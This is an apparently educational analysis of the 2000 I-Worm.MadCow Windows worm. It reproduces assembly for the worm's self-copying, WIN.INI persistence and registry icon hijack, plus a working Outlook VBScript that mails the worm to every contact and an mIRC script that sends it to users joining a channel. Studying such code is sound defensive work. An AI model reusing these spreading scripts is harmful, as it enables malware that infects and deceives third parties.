
## Analysis of the I-Worm.MadCow Worm

### Introduction

The **I-Worm.MadCow** is a self-replicating malware, known as a worm, created by PetiK in 2000. Written in 32-bit assembly language for Windows systems, this malicious program spreads through email and IRC channels while employing techniques to persist on infected machines. This analysis explores its source code to reveal how it operates and the methods its creator used to make it effective.

### General Structure of the Code

The worm is coded in **32-bit assembly** using tools like TASM32 (assembler) and TLINK32 (linker), targeting Windows operating systems. It depends on two key Windows libraries:

-   **KERNEL32.dll**: Provides functions like `CopyFileA` and `CreateFileA` for file operations.
-   **ADVAPI32.dll**: Enables registry manipulation with calls like `RegSetValueExA`.

The program is divided into sections, each handling a specific task: checking for prior infection, copying itself, ensuring persistence, spreading to other systems, and disguising its presence.

### How the Worm Works

#### 1. Checking for Previous Infection

The worm first checks if the system is already infected by looking for a registry key: `HKEY_LOCAL_MACHINE\Software\[Atchoum]`. If this key exists, it skips the infection process.

```assembly
VERIF:  mov  eax, offset CLE        ; Points to "Software\[Atchoum]"
        call REG                    ; Checks the registry
        cmp  [regDisp], 1           ; If regDisp = 1, key exists
        jne  INIFILE                ; If not, proceed to install
```

The `REG` function uses `RegCreateKeyExA` to check or create the key, storing the result in `regDisp`.

#### 2. Copying Itself to the System

If the system isn’t infected, the worm copies itself to two locations:

-   **System Directory** (e.g., `C:\Windows\System32`) as `Wininet32.exe`.
-   **Windows Directory** (e.g., `C:\Windows`) as `MadCow.exe`.

It retrieves these directories using `GetSystemDirectoryA` and `GetWindowsDirectoryA`, then uses `CopyFileA` to duplicate itself.

```assembly
COPIE:  push 0
        call GetModuleHandleA       ; Gets the current module
        push 260
        push offset szOrig
        push eax
        call GetModuleFileNameA     ; Gets the worm’s file path
        push 260
        push offset szCopie
        call GetSystemDirectoryA    ; Gets system directory
        push offset Copie           ; "\Wininet32.exe"
        push offset szCopie
        call lstrcat                ; Builds the full path
        push 00h
        push offset szCopie
        push offset szOrig
        call CopyFileA              ; Copies the file
```

#### 3. Ensuring Persistence

To launch at every system startup, the worm edits the `WIN.INI` file in the Windows directory. It adds a line under the `[windows]` section: `run="path_to_Wininet32.exe"`.

```assembly
WIN_INI: push 260
         push offset szWin
         call GetWindowsDirectoryA   ; Gets Windows directory
         push offset Winini          ; "\WIN.INI"
         push offset szWin
         call lstrcat                ; Builds path to WIN.INI
         push offset szWin
         push offset szCopie         ; Path to Wininet32.exe
         push offset run             ; "run"
         push offset windows         ; "windows"
         call WritePrivateProfileStringA ; Updates WIN.INI
```
#### 4. Creating Files for Propagation

The worm creates a folder `C:\Win32` and adds several files:

-   **ENVOIE.VBS**: A VBScript for sending emails.
-   **ENVOIE.BAT**: A batch file to run the VBScript.
-   **script.ini**: A script to infect IRC users via mIRC.
-   **Salut.ico**: An icon for disguising executable files.

```assembly
DIR:    push 00h
        push offset Dossier         ; "C:\Win32"
        call CreateDirectoryA       ; Creates the folder

EMAIL:  push 00000000h
        push 00000080h              ; Normal file attribute
        push 00000002h              ; CREATE_ALWAYS
        push 00000000h
        push 00000001h              ; Read sharing
        push 40000000h              ; Write access
        push offset VBSFILE         ; "C:\Win32\ENVOIE.VBS"
        call CreateFileA            ; Creates the file
        mov  [fh], eax
        push 00h
        push offset octets
        push vbstaille              ; Size of VBS script
        push offset vbsd            ; VBS script content
        push [fh]
        call WriteFile              ; Writes the script
        push [fh]
        call CloseHandle            ; Closes the file
```

#### 5. Spreading via Email

The `ENVOIE.VBS` script uses Microsoft Outlook to email `MadCow.exe` to all contacts in the user’s address book. The email has:

-   **Subject**: "Why are cows mad?"
-   **Body**: "Here is a report explaining the madness of cows"
-   **Attachment**: `MadCow.exe`

```vbscript
Sub EMAIL()
    Set K = CreateObject("Outlook.Application")
    Set L = K.GetNameSpace("MAPI")
    For Each M In L.AddressLists
        If M.AddressEntries.Count <> 0 Then
            Set N = K.CreateItem(0)
            For O = 1 To M.AddressEntries.Count
                Set P = M.AddressEntries(O)
                If O = 1 Then
                    N.BCC = P.Address
                Else
                    N.BCC = N.BCC & "; " & P.Address
                End If
            Next
            N.Subject = "Why are cows mad?"
            N.Body = "Here is a report explaining the madness of cows"
            Set Q = CreateObject("Scripting.FileSystemObject")
            N.Attachments.Add Q.BuildPath(Q.GetSpecialFolder(0),"MadCow.exe")
            N.Send
        End If
    Next
End Sub
```

The `ENVOIE.BAT` file triggers this script using `WinExec`.

#### 6. Spreading via IRC

The worm places a `script.ini` file in `C:\Win32` and copies it to mIRC folders (e.g., `C:\mirc`). This script sends `MadCow.exe` to users joining an IRC channel.

```ini
[script]
n0=on 1:JOIN:#:{
n1= /if ( $nick == $me ) { halt }
n2= /.dcc send $nick C:\Win32\MadCow.exe
n3=}
```


#### 7. Disguising Executables

The worm creates an icon file `Salut.ico` in `C:\Win32`, moves it to the system directory as `MSLS.ICO`, and updates the registry key HKEY_CLASSES_ROOT\exefile\DefaultIcon. This changes the icon of all `.exe` files to `MSLS.ICO`, tricking users into thinking the worm is harmless.

```assembly
REG2:    push offset l
         push offset p
         push 0
         push 1F0000h + 1 + 2h       ; Access rights
         push 0
         push 0
         push 0
         push offset CLE2            ; "\exefile\DefaultIcon"
         push 80000000h              ; HKEY_CLASSES_ROOT
         call RegCreateKeyExA
         push 05h                    ; Size of szCico
         push offset szCico          ; Path to MSLS.ICO
         push 01h                    ; REG_SZ
         push 0
         push 00h
         push p
         call RegSetValueExA         ; Sets the new icon
```

### Key Techniques Used

-   **Persistence**: Adds itself to `WIN.INI` to run on startup.
-   **Propagation**:
    -   Sends emails via Outlook using `ENVOIE.VBS`.
    -   Infects IRC users via `script.ini` and `mIRC`.
-   **Disguise**: Changes the default icon of .exe files to confuse users.

### Conclusion

The **I-Worm.MadCow** was an advanced piece of malware for its era, blending infection, spreading mechanisms, and deception. Though its techniques are now outdated, studying it offers valuable insights into malware evolution and helps improve modern cybersecurity defenses.
